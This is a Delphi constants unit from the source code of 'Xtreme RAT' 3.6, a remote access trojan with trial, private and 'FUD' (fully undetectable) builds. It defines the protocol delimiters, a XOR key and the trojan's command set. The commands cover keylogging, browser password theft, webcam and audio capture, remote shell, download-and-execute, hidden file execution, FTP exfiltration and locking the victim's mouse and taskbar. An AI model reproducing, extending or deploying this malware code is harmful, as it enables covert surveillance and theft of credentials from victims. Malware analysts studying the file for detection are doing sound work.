unit UnitConstantes;
{$I Compilar.inc}
interface

const
  NomeDoPrograma = 'Xtreme RAT';

  {$IFDEF XTREMETRIAL}
  VersaoDoPrograma = '3.6';
  {$ENDIF}

  {$IFDEF XTREMEPRIVATE}
  VersaoDoPrograma = '3.6 Private';
  {$ENDIF}

  {$IFDEF XTREMEPRIVATEFUD}
  VersaoDoPrograma = '3.6 Private (FUD)';
  {$ENDIF}

  DelimitadorComandos = 'ªªª###╚╚╚';
  DelimitadorComandosPassword = '###@@@!!!';
  RegeditDelimitador = '$%%$**';
  ResourceName = 'XTREME';
  EditSvrID = '&&&@&&&';
  XORPass = 123;
  MaxBufferSize = 32768;

  NEWVERSION = 'newversion';
  MYVERSION = 'myversion';
  WRONGPASS = 'wrongpass';
  NEWCONNECTION = 'newconnection';
  MAININFO = 'maininfo';
  WEBCAMLIST = 'webcamlist';
  DESINSTALAR = 'desinstalar';
  DESCONECTAR = 'desconectar';
  RECONECTAR = 'reconectar';
  CHANGEGROUP = 'changegroup';
  DESATIVAR = 'desativar';
  RESTARTSERVER = 'restartserver';
  RENOMEAR = 'renomear';
  UPDATESERVERLOCAL = 'updateserverlocal';
  RECEBERARQUIVO = 'receberarquivo';
  EXECCOMANDO = 'execcomando';
  DOWNEXEC = 'downexec';
  UPDATESERVERLINK = 'updateserverlink';
  OPENWEB = 'openweb';
  PING = 'ping';
  PONG = 'pong';
  GETACCOUNTTYPE = 'getaccounttype';
  GETPASSWORDS = 'getpasswords';
  KEYSEARCH = 'keysearch';
  FILESEARCH = 'filesearch';
  ENVIARLOGSKEY = 'enviarlogskey';

  GETPROCESSLIST = 'getprocesslist';
  KILLPROCESSID = 'killprocessid';
  SUSPENDPROCESSID = 'suspendprocess';
  RESUMEPROCESSID = 'resumeprocessid';
  CPUUSAGE = 'cpuusage';
  PROCESS = 'processos';

  JANELAS = 'janelas';
  LISTADEJANELAS = 'listadejanelas';
  FECHARJANELA = 'fecharjanela';
  HABILITARJANELA = 'habilitarjanela';
  DESABILITARJANELA = 'desabilitarjanela';
  OCULTARJANELA = 'ocultarjanela';
  MOSTRARJANELA = 'mostrarjanela';
  MINIMIZARJANELA = 'minimizarjanela';
  MAXIMIZARJANELA = 'maximizarjanela';
  RESTAURARJANELA = 'restaurarjanela';
  FINALIZARJANELA = 'finalizarjanela';
  MUDARCAPTION = 'mudarcaption';
  CRAZYWINDOW = 'crazywindow';
  SENDKEYSWINDOW = 'sendkeyswindow';
  WINDOWPREV = 'windowprev';
  
  SERVICOS = 'servicos';
  LISTADESERVICOS = 'listadeservicos';
  INSTALARSERVICO = 'instalarservico';
  PARARSERVICO = 'pararservico';
  INICIARSERVICO = 'iniciarservico';
  REMOVERSERVICO = 'removerservico';
  EDITARSERVICO = 'editarservico';

  REGISTRO = 'registro';
  LISTADECHAVES = 'listadechaves';
  LISTADEDADOS = 'listadedados';
  NOVOREGISTRO = 'novoregistro';
  RENOMEARREGISTRO = 'renomearregistro';
  NOVACHAVE = 'novachave';
  APAGARREGISTRO = 'apagarregistro';
  APAGARCHAVE = 'apagarchave';
  RENOMEARCHAVE = 'renomearchave';
  STARTUPMANAGER = 'startupmanager';

  SHELL = 'shell';
  SHELLSTART = 'shellstart';
  SHELLCOMMAND = 'shellcommand';
  SHELLDESATIVAR = 'shelldesativar';

  CLIPBOARD = 'clipboard';
  GETCLIPBOARD = 'getclipboard';
  CLEARCLIPBOARD = 'clearclipboard';
  SETCLIPBOARD = 'setclipboard';

  LISTADEDISPOSITIVOSPRONTA = 'listadedispositivospronta';
  LISTADEDISPOSITIVOSEXTRASPRONTA = 'listadedispositivosextraspronta';
  LISTDEVICES = 'listdevices';
  LISTEXTRADEVICES = 'listextradevices';

  LISTADEPORTASPRONTA = 'listadeportasativas';
  FINALIZARCONEXAO = 'finalizarconexao';
  FINALIZARPROCESSOPORTAS = 'finalizarprocessoportas';
  LISTARPORTAS = 'listarportas';
  LISTARPORTASDNS = 'listarportasdns';

  PROGRAMAS = 'programas';
  LISTADEPROGRAMAS = 'listadeprogramas';
  DESINSTALARPROGRAMA = 'desinstalarprograma';
  DESINSTALARPROGRAMASILENT = 'desinstalarprogramassilent';

  DESKTOP = 'desktop';
  DESKTOPNEW = 'desktopnew';
  DESKTOPCONFIG = 'desktopconfig';
  STARTDESKTOP = 'startdesktop';
  DESKTOPSTREAM = 'desktopstream';
  DESKTOPMOUSEPOS = 'desktopmousepos';
  DESKTOPMOVEMOUSE = 'desktopmovemouse';
  DESKTOPPREVIEW = 'desktoppreview';
  TECLADOEXECUTAR = 'tecaladoexecutar';
  MOUSECLICK = 'mouseclick';

  WEBCAM = 'webcam';
  WEBCAMSTART = 'webcamstart';
  WEBCAMSTREAM = 'webcamstream';
  WEBCAMCONFIG = 'webcamconfig';
  WEBCAMSTOP = 'webcamstop';

  FDIVERSOS = 'fdiversos';
  NEWFDIVERSOS = 'newfdiversos';
  FMESSAGE = 'fmessage';
  FSHUTDOWN = 'fshutdown';
  FHIBERNAR = 'fhibernar';
  FLOGOFF = 'flogoff';
  POWEROFF = 'fpoweroff';
  FRESTART = 'frestart';
  FDESLMONITOR = 'fdeslmonitor';
  BTN_START_HIDE = 'btnstarthide';
  BTN_START_SHOW = 'btnstartshow';
  BTN_START_BLOCK = 'btnstartblock';
  BTN_START_UNBLOCK = 'btnstartunblock';
  DESK_ICO_HIDE = 'deskicohide';
  DESK_ICO_SHOW = 'deskicoshow';
  DESK_ICO_BLOCK = 'deskicoblock';
  DESK_ICO_UNBLOCK = 'deskicounblock';
  TASK_BAR_HIDE = 'taskbarhide';
  TASK_BAR_SHOW = 'taskbarshow';
  TASK_BAR_BLOCK = 'taskbarblock';
  TASK_BAR_UNBLOCK = 'taskbarunblock';
  MOUSE_BLOCK = 'mouseblock';
  MOUSE_UNBLOCK = 'mouseunblock';
  MOUSE_SWAP = 'mouseswap';
  SYSTRAY_ICO_HIDE = 'systrayicohide';
  SYSTRAY_ICO_SHOW = 'systrayicoshow';
  OPENCD = 'opencd';
  CLOSECD = 'closecd';

  KEYLOGGER = 'keylogger';
  KEYLOGGERNEW = 'keyloggernew';
  KEYLOGGERATIVAR = 'keyloggerativar';
  KEYLOGGERDESATIVAR = 'keyloggerdesativar';
  KEYLOGGERBAIXAR = 'keyloggerbaixar';
  KEYLOGGEREXCLUIR = 'keyloggerexcluir';
  KEYLOGGERONLINESTART = 'keyloggeronlinestart';
  KEYLOGGERONLINESTOP = 'keyloggeronlinestop';
  KEYLOGGERONLINEKEY = 'keyloggeronlinekey';

  FILEMANAGER = 'filemanager';
  FILEMANAGERNEW = 'filemanagernew';
  FMDRIVELIST = 'fmdrivelist';
  FMSPECIALFOLDERS = 'fmspecialfolders';
  FMSPECIALFOLDERS2 = 'fmspecialfolders2';
  FMSHAREDDRIVELIST = 'fmshareddrivelist';
  FMFOLDERLIST = 'fmfolderlist';
  FMFOLDERLIST2 = 'fmfolderlist2';
  FMFILELIST = 'fmfilelist';
  FMFILELIST2 = 'fmfilelist2';
  FMFILESEARCHLIST = 'fmfilesearchlist';
  FMFILESEARCHLISTSTOP = 'fmfilesearchliststop';
  FMCRIARPASTA = 'fmcriarpasta';
  FMRENOMEARPASTA = 'fmrenomearcriarpasta';
  FMDELETARPASTA = 'fmdeletarpasta';
  FMDELETARPASTALIXO = 'fmdeletarpastalixo';
  FMEXECNORMAL = 'fmexecnormal';
  FMEXECHIDE = 'fmexechide';
  FMEXECPARAM = 'fmexecparam';
  FMDELETARARQUIVO = 'fmdeletararquivo';
  FMDELETARARQUIVOLIXO = 'fmdeletararquivolixo';
  FMEDITARARQUIVO = 'fmeditararquivo';
  FMWALLPAPER = 'fmwallpaper';
  FMTHUMBS = 'fmthumbs';
  FMTHUMBS2 = 'fmthumbs2';
  FMTHUMBS_SEARCH = 'fmthumbs_search';
  FMDOWNLOAD = 'fmdownload';
  FMDOWNLOADFOLDERADD = 'fmdownloadfolderadd';
  FMDOWNLOADFOLDER = 'fmdownloadfolder';
  FMDOWNLOADERROR = 'fmdownloaderror';
  FMRESUMEDOWNLOAD = 'fmresumedownload';
  FMUPLOAD = 'fmupload';
  FMUPLOADERROR = 'fmuploaderror';
  FMCOPYFILE = 'fmcopyfile';
  FMCOPYFOLDER = 'fmcopyfolder';
  FMDOWNLOADALL = 'fmdownloadall';
  FMRARFILE = 'fmrarfile';
  FMGETRARFILE = 'fmgetrarfile';
  FMUNRARFILE = 'fmunrarfile';
  FMCHECKRAR = 'fmcheckrar';
  FMUNZIPFILE = 'fmunzipfile';

  AUDIO = 'audio';
  AUDIOSETTINGS = 'audiosettings';
  AUDIOSTREAM = 'audiostream';
  STARTAUDIO = 'startaudio';

  SERVERSETTINGS = 'serversettings';
  GETSERVERSETTINGS = 'getserversettings';
  GETDESKTOPPREVIEW = 'getdesktoppreview';
  GETDESKTOPPREVIEWINFO = 'getdesktoppreviewinfo';

  CHANGESERVERSETTINGS = 'changeserversettings';
  CHROMEPASS = 'chromepass';

  CHAT = 'chat';
  CHATSTART = 'chatstart';
  CHATSTOP = 'chatstop';
  CHATTEXT = 'chattext';
  
  MSN = 'msn';
  GETMSNSTATUS = 'getmsnstatus';
  SETMSNSTATUS = 'setmsnstatus';
  MSNCONTACTLIST = 'msncontactlist';
  EXITMSN = 'exitmsn';
  MSNINFO = 'msninfo';
  MSNADDCONTACT = 'msnaddcontact';
  MSNDELCONTACT = 'msndelcontact';
  MSNBLOCKCONTACT = 'msnblockcontact';
  MSNUNBLOCKCONTACT = 'msnunblockcontact';

  PROXYSTART = 'proxystart';
  PROXYSTOP = 'proxystop';
  MOUSESTART = 'mousestart';
  MOUSESTOP = 'mousestop';
  
  UPLOADANDEXECUTE = 'uploadandexecute';
  UPLOADANDEXECUTEYES = 'uploadandexecuteyes';
  UPLOADANDEXECUTENO = 'uploadandexecuteno';
  
  FMSENDFTP = 'fmsendftp';
  FMSENDFTPYES = 'fmsendftpyes';
  FMSENDFTPNO = 'fmsendftpno';
  
  MOUSELOGGERSTOP = 'mouseloggerstop';
  MOUSELOGGERSTART = 'mouseloggerstart';
  MOUSELOGGERBUFFER = 'mouseloggerbuffer';
  MOUSELOGGERSTARTSEND = 'mouseloggerstartsend';
  MOUSELOGGERSTOPSEND = 'mouseloggerstopsend';
  MOUSELOGGERDELETE = 'mouseloggerdelete';
implementation

end.
